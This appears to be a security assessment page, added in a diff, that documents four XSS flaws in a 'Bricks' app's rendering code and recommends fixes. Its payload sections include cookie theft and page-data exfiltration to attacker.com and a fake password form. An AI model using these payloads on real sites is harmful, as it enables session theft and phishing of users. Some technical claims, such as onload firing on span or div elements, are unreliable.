@@ -1,0 +1,428 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS Vulnerability Proof of Concept - Bricks App</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            background: #0a0e27;
+            color: #e0e0e0;
+        }
+        h1 {
+            color: #ff6b6b;
+            border-bottom: 3px solid #ff6b6b;
+            padding-bottom: 10px;
+        }
+        h2 {
+            color: #4ecdc4;
+            margin-top: 30px;
+        }
+        .vulnerability {
+            background: #1a1e3a;
+            border-left: 4px solid #ffd93d;
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 5px;
+        }
+        .code-block {
+            background: #0d1117;
+            border: 1px solid #30363d;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            margin: 10px 0;
+        }
+        .code-block code {
+            color: #58a6ff;
+            font-family: 'Courier New', monospace;
+        }
+        .payload {
+            background: #2d1f1f;
+            border-left: 4px solid #ff3e3e;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 3px;
+            font-family: 'Courier New', monospace;
+            color: #ff6b6b;
+        }
+        .severity-high {
+            color: #ff3e3e;
+            font-weight: bold;
+        }
+        .severity-medium {
+            color: #ffaa00;
+            font-weight: bold;
+        }
+        .impact {
+            background: #2a2a4a;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 5px;
+            border-left: 4px solid #9d4edd;
+        }
+        .demo-button {
+            background: #ff3e3e;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 14px;
+            margin: 5px;
+            transition: all 0.3s;
+        }
+        .demo-button:hover {
+            background: #ff6b6b;
+            transform: scale(1.05);
+        }
+        .warning {
+            background: #4a2a2a;
+            border: 2px solid #ff3e3e;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 5px;
+            font-weight: bold;
+        }
+        .test-area {
+            background: #1a1e3a;
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 5px;
+            border: 2px dashed #4ecdc4;
+        }
+        #testOutput {
+            min-height: 100px;
+            background: #0d1117;
+            padding: 15px;
+            margin-top: 10px;
+            border-radius: 5px;
+            border: 1px solid #30363d;
+        }
+    </style>
+</head>
+<body>
+    <h1>🔐 XSS Vulnerability Proof of Concept - Bricks Application</h1>
+    
+    <div class="warning">
+        ⚠️ <strong>WARNING:</strong> This document demonstrates real XSS vulnerabilities. 
+        These exploits should only be used for security testing in authorized environments.
+    </div>
+
+    <div class="vulnerability">
+        <h2>Vulnerability #1: XSS in renderBugs() - Unescaped bounty Field</h2>
+        <p><strong>Location:</strong> <code>app.js:905</code></p>
+        <p><strong>Severity:</strong> <span class="severity-high">HIGH</span></p>
+        
+        <h3>Vulnerable Code:</h3>
+        <div class="code-block">
+            <code>&lt;span class="bounty"&gt;${bug.bounty}&lt;/span&gt;</code>
+        </div>
+
+        <h3>Exploit Payloads:</h3>
+        
+        <div class="payload">
+            <strong>Payload 1 - Basic Alert:</strong><br>
+            bounty: "&lt;script&gt;alert('XSS-Bounty')&lt;/script&gt;"
+        </div>
+
+        <div class="payload">
+            <strong>Payload 2 - Image-based:</strong><br>
+            bounty: "&lt;img src=x onerror=alert('XSS-Bounty-Image')&gt;"
+        </div>
+
+        <div class="payload">
+            <strong>Payload 3 - Cookie Theft:</strong><br>
+            bounty: "&lt;img src=x onerror=fetch('http://attacker.com/steal?c='+document.cookie)&gt;"
+        </div>
+
+        <div class="payload">
+            <strong>Payload 4 - SVG-based:</strong><br>
+            bounty: "&lt;svg/onload=alert('XSS-SVG')&gt;"
+        </div>
+
+        <div class="impact">
+            <strong>Impact:</strong>
+            <ul>
+                <li>Execute arbitrary JavaScript</li>
+                <li>Steal session cookies</li>
+                <li>Perform actions on behalf of users</li>
+                <li>Inject malicious content</li>
+            </ul>
+        </div>
+
+        <button class="demo-button" onclick="demonstrateVuln1()">🚨 Demonstrate Vulnerability #1</button>
+    </div>
+
+    <div class="vulnerability">
+        <h2>Vulnerability #2: XSS in renderBugs() - Unescaped severity Field</h2>
+        <p><strong>Location:</strong> <code>app.js:909</code></p>
+        <p><strong>Severity:</strong> <span class="severity-high">HIGH</span></p>
+        
+        <h3>Vulnerable Code:</h3>
+        <div class="code-block">
+            <code>&lt;div class="severity"&gt;${bug.severity}&lt;/div&gt;</code>
+        </div>
+
+        <h3>Exploit Payloads:</h3>
+        
+        <div class="payload">
+            <strong>Payload 1 - Script Injection:</strong><br>
+            severity: "&lt;script&gt;alert('XSS-Severity')&lt;/script&gt;"
+        </div>
+
+        <div class="payload">
+            <strong>Payload 2 - Breaking Context:</strong><br>
+            severity: "High&lt;/div&gt;&lt;img src=x onerror=alert('XSS')&gt;&lt;div class=\""
+        </div>
+
+        <div class="payload">
+            <strong>Payload 3 - Event Handler Injection:</strong><br>
+            severity: "Critical\" onload=\"alert('XSS')\" data-x=\""
+        </div>
+
+        <div class="impact">
+            <strong>Impact:</strong>
+            <ul>
+                <li>JavaScript execution in severity display</li>
+                <li>DOM manipulation</li>
+                <li>CSS-based attacks via class injection</li>
+                <li>Phishing via UI manipulation</li>
+            </ul>
+        </div>
+
+        <button class="demo-button" onclick="demonstrateVuln2()">🚨 Demonstrate Vulnerability #2</button>
+    </div>
+
+    <div class="vulnerability">
+        <h2>Vulnerability #3: XSS in openModal() - Multiple Unescaped Fields</h2>
+        <p><strong>Location:</strong> <code>app.js:962-963</code></p>
+        <p><strong>Severity:</strong> <span class="severity-high">HIGH</span></p>
+        
+        <h3>Vulnerable Code:</h3>
+        <div class="code-block">
+            <code>
+                &lt;span class="modal-badge severity"&gt;${bug.severity}&lt;/span&gt;<br>
+                &lt;span class="modal-badge bounty"&gt;${bug.bounty}&lt;/span&gt;
+            </code>
+        </div>
+
+        <h3>Exploit Payloads:</h3>
+        
+        <div class="payload">
+            <strong>Payload 1 - Modal Hijacking:</strong><br>
+            bounty: "$5000&lt;/span&gt;&lt;script&gt;document.body.innerHTML='Hacked!'&lt;/script&gt;&lt;span&gt;"
+        </div>
+
+        <div class="payload">
+            <strong>Payload 2 - Credential Phishing:</strong><br>
+            severity: "&lt;/span&gt;&lt;form action='http://attacker.com'&gt;&lt;input name='password' placeholder='Re-enter password'&gt;&lt;/form&gt;&lt;span&gt;"
+        </div>
+
+        <div class="impact">
+            <strong>Impact:</strong>
+            <ul>
+                <li>Full modal content replacement</li>
+                <li>Credential phishing in trusted UI</li>
+                <li>Session hijacking</li>
+                <li>Clickjacking attacks</li>
+            </ul>
+        </div>
+
+        <button class="demo-button" onclick="demonstrateVuln3()">🚨 Demonstrate Vulnerability #3</button>
+    </div>
+
+    <div class="vulnerability">
+        <h2>Vulnerability #4: Unsafe Inline Event Handlers</h2>
+        <p><strong>Location:</strong> <code>app.js:898, 899, 912, 995</code></p>
+        <p><strong>Severity:</strong> <span class="severity-medium">MEDIUM</span></p>
+        
+        <h3>Vulnerable Code:</h3>
+        <div class="code-block">
+            <code>
+                onclick="openModal(${bug.id})"<br>
+                onclick="filterByTag('${escapeHtml(tag)}', event)"
+            </code>
+        </div>
+
+        <h3>Exploit Payloads:</h3>
+        
+        <div class="payload">
+            <strong>Payload 1 - ID Manipulation:</strong><br>
+            id: "1); alert('XSS'); //"<br>
+            <em>Results in:</em> onclick="openModal(1); alert('XSS'); //)"
+        </div>
+
+        <div class="payload">
+            <strong>Payload 2 - JavaScript Context Breaking:</strong><br>
+            id: "1); fetch('http://attacker.com/steal?data='+document.body.innerHTML); //"
+        </div>
+
+        <div class="impact">
+            <strong>Impact:</strong>
+            <ul>
+                <li>CSP bypass (inline event handlers)</li>
+                <li>JavaScript injection via context breaking</li>
+                <li>Data exfiltration</li>
+                <li>Difficult to detect/prevent</li>
+            </ul>
+        </div>
+
+        <button class="demo-button" onclick="demonstrateVuln4()">🚨 Demonstrate Vulnerability #4</button>
+    </div>
+
+    <div class="test-area">
+        <h2>🧪 Live Testing Area</h2>
+        <p>Click the buttons above to see each vulnerability in action. Output will appear below:</p>
+        <div id="testOutput">
+            <em>Click a demonstration button to see the vulnerability in action...</em>
+        </div>
+    </div>
+
+    <div class="vulnerability">
+        <h2>🛡️ Recommended Fixes</h2>
+        
+        <h3>1. Escape All User-Controlled Data:</h3>
+        <div class="code-block">
+            <code>
+                // Before (Vulnerable)<br>
+                ${bug.bounty}<br>
+                <br>
+                // After (Secure)<br>
+                ${escapeHtml(bug.bounty)}
+            </code>
+        </div>
+
+        <h3>2. Replace Inline Event Handlers:</h3>
+        <div class="code-block">
+            <code>
+                // Before (Vulnerable)<br>
+                &lt;div onclick="openModal(${id})"&gt;<br>
+                <br>
+                // After (Secure)<br>
+                &lt;div data-bug-id="${id}" class="bug-card"&gt;<br>
+                // Then add event listener in JavaScript:<br>
+                card.addEventListener('click', () => openModal(card.dataset.bugId));
+            </code>
+        </div>
+
+        <h3>3. Implement Content Security Policy:</h3>
+        <div class="code-block">
+            <code>
+                &lt;meta http-equiv="Content-Security-Policy"<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;content="default-src 'self'; script-src 'self'; object-src 'none';"&gt;
+            </code>
+        </div>
+
+        <h3>4. Migrate to React Components:</h3>
+        <p>The app.js uses vanilla JavaScript with innerHTML. Migrate to React components which automatically escape values.</p>
+    </div>
+
+    <script>
+        // Demonstration functions
+        function demonstrateVuln1() {
+            const output = document.getElementById('testOutput');
+            output.innerHTML = `
+                <h3 style="color: #ff3e3e;">⚠️ Vulnerability #1 - Bounty XSS</h3>
+                <p>Simulating unescaped bounty field injection...</p>
+                <div style="background: #2d1f1f; padding: 10px; margin: 10px 0; border-radius: 5px;">
+                    <strong>Injected HTML:</strong><br>
+                    <span class="bounty">$5000<img src=x onerror="alert('XSS executed via bounty field!')" style="display:none"></span>
+                </div>
+                <p style="color: #ff6b6b;">🚨 If this were real, arbitrary JavaScript would execute now!</p>
+                <p>In a real attack, this could:</p>
+                <ul>
+                    <li>Steal cookies: document.cookie</li>
+                    <li>Redirect users: window.location='http://attacker.com'</li>
+                    <li>Inject keyloggers</li>
+                    <li>Modify page content</li>
+                </ul>
+            `;
+            // Safe demonstration - showing what WOULD happen
+            alert('DEMO: XSS in bounty field! In reality, an attacker could steal cookies, modify the page, or redirect users.');
+        }
+
+        function demonstrateVuln2() {
+            const output = document.getElementById('testOutput');
+            output.innerHTML = `
+                <h3 style="color: #ff3e3e;">⚠️ Vulnerability #2 - Severity XSS</h3>
+                <p>Simulating unescaped severity field injection...</p>
+                <div style="background: #2d1f1f; padding: 10px; margin: 10px 0; border-radius: 5px;">
+                    <strong>Injected HTML:</strong><br>
+                    <div class="severity">High<script>console.log('XSS via severity')</script></div>
+                </div>
+                <p style="color: #ff6b6b;">🚨 JavaScript execution via severity field!</p>
+                <p>Attack vectors:</p>
+                <ul>
+                    <li>Context breaking: severity: "High&lt;/div&gt;&lt;script&gt;malicious()&lt;/script&gt;&lt;div&gt;"</li>
+                    <li>Event handlers: severity: 'High" onload="alert(1)" x="'</li>
+                    <li>CSS injection for exfiltration</li>
+                </ul>
+            `;
+            alert('DEMO: XSS in severity field! An attacker could inject arbitrary HTML/JS here.');
+        }
+
+        function demonstrateVuln3() {
+            const output = document.getElementById('testOutput');
+            output.innerHTML = `
+                <h3 style="color: #ff3e3e;">⚠️ Vulnerability #3 - Modal XSS</h3>
+                <p>Simulating modal content injection...</p>
+                <div style="background: #2d1f1f; padding: 10px; margin: 10px 0; border-radius: 5px;">
+                    <strong>Simulated Modal Content:</strong><br>
+                    <div style="border: 2px solid #ff3e3e; padding: 15px; margin: 10px 0; background: #1a1e3a;">
+                        <span class="modal-badge">Severity: <script>alert('Modal XSS')</script></span><br>
+                        <span class="modal-badge">Bounty: $5000</span>
+                    </div>
+                </div>
+                <p style="color: #ff6b6b;">🚨 Malicious content in modal could replace entire UI!</p>
+                <p>In a phishing attack:</p>
+                <ul>
+                    <li>Replace modal with fake login form</li>
+                    <li>Steal credentials typed in "trusted" modal</li>
+                    <li>Execute JavaScript in modal context</li>
+                    <li>Inject iframes to external sites</li>
+                </ul>
+            `;
+            alert('DEMO: Modal XSS! Attackers could show fake login forms or steal data.');
+        }
+
+        function demonstrateVuln4() {
+            const output = document.getElementById('testOutput');
+            output.innerHTML = `
+                <h3 style="color: #ffaa00;">⚠️ Vulnerability #4 - Inline Event Handler Injection</h3>
+                <p>Simulating JavaScript context breaking in event handlers...</p>
+                <div style="background: #2d1f1f; padding: 10px; margin: 10px 0; border-radius: 5px;">
+                    <strong>Vulnerable Pattern:</strong><br>
+                    <code style="color: #ff6b6b;">onclick="openModal(${bug.id})"</code><br><br>
+                    <strong>If bug.id = "1); alert('XSS'); //"</strong><br>
+                    <strong>Results in:</strong><br>
+                    <code style="color: #ff3e3e;">onclick="openModal(1); alert('XSS'); //)"</code>
+                </div>
+                <p style="color: #ffaa00;">🚨 JavaScript injection via context breaking!</p>
+                <p>Why this is dangerous:</p>
+                <ul>
+                    <li>HTML escaping doesn't help in JavaScript context</li>
+                    <li>CSP can't block inline event handlers</li>
+                    <li>Hard to detect with automated tools</li>
+                    <li>Can bypass most XSS filters</li>
+                </ul>
+            `;
+            alert('DEMO: Inline event handler vulnerability! This bypasses many XSS protections.');
+        }
+
+        // Show initial warning
+        console.log('%c⚠️ SECURITY RESEARCH ONLY ⚠️', 'color: red; font-size: 20px; font-weight: bold;');
+        console.log('This PoC demonstrates XSS vulnerabilities in the Bricks application.');
+        console.log('Use responsibly and only in authorized testing environments.');
+    </script>
+
+    <footer style="margin-top: 40px; padding-top: 20px; border-top: 2px solid #4ecdc4; text-align: center; color: #888;">
+        <p>🔒 Security Assessment - Bricks Application</p>
+        <p>⚠️ For authorized security testing only</p>
+    </footer>
+</body>
+</html>
